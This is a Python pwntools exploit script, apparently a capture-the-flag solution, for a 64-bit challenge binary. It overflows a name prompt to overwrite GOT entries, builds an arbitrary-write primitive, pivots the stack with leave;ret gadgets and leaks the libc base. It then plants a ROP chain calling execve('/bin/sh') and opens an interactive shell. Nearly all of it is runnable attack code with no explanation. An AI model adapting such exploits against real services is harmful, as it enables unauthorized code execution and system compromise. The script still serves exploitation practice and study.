#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

ret_addr = 0x000000000040101A
leave_ret = 0x00000000004013A3
output_addr = 0x401150

ru(b"What is your first name? ")
payload = flat(
    {
        0x000: 0x401302,
        0x0D0: elf.got.setbuf,
        0x110: [
            0xDEADBEEF,
            0xCAFECAFE,
        ],
        0x130: elf.got.__stack_chk_fail,
        0x140: 0xCAFECAFE,
    }
)
sl(payload)

ru(b"How old are you? ")
sl(i2b(0x404100))

new_stack = 0x404340 + 0x900 + 8
new_bp = new_stack + 0x40 + 8

another_new_stack = 0x404440


def arb_write(addr, data):
    ru(b"What is your first name? ")
    payload = flat(
        {
            0x000: data,
            0x0D0: 0xDEADCAFE,
            0x110: [
                another_new_stack - 8,
                leave_ret,
            ],
            0x130: addr,
            0x140: 0xCAFECAFE,
        }
    )
    sl(payload)
    ru(b"How old are you? ")
    sl(i2b(0))

    # 0x404020=0xdeadbeef


arb_write(new_stack - 8, new_bp)
arb_write(new_stack, 0x4013E0)
arb_write(new_stack + 8, elf.got.setbuf)
arb_write(new_stack + 8 * 2, 6)
# arb_write(new_bp, 0xDEADBEEF)
arb_write(new_bp + 8, elf.sym.main)
arb_write(0x404021, 0x4015)
arb_write(0x404028, 0xADAD4011F0)
arb_write(0x404028, 0xAD4011F0)
arb_write(0x404028, ret_addr)

ru(b"What is your first name? ")
payload = flat(
    {
        0x000: leave_ret,
        0x0D0: elf.got.setbuf,
        0x110: [
            new_stack - 8,
            leave_ret,
            leave_ret,
        ],
        0x130: elf.got.__stack_chk_fail,
        0x140: 0xCAFECAFE,
    }
)
sl(payload)
ru(b"How old are you? ")
sl(i2b(0x40130C))

ru(b"Name: ")
libc_base = u64_ex(ru(b"\n", drop=True)) - libc.sym.setbuf
lg("libc_base", libc_base)
lg("stack_addr", new_stack)

pop_rdi_ret = 0x000000000002A3E5 + libc_base
pop_rsi_ret = 0x000000000002BE51 + libc_base
pop_rax_ret = 0x0000000000045EB0 + libc_base
syscall_ret = 0x0000000000091396 + libc_base

arb_write(elf.got.__stack_chk_fail, 0x401302)
arb_write(another_new_stack, pop_rdi_ret)
arb_write(another_new_stack + 0x8, libc_base + next(libc.search(b"/bin/sh\x00")))
arb_write(another_new_stack + 0x10, pop_rsi_ret)
arb_write(another_new_stack + 0x18, 0)
arb_write(another_new_stack + 0x20, pop_rax_ret)
arb_write(another_new_stack + 0x28, 59)
arb_write(another_new_stack + 0x30, syscall_ret)

arb_write(elf.got.__stack_chk_fail, leave_ret)

ia()
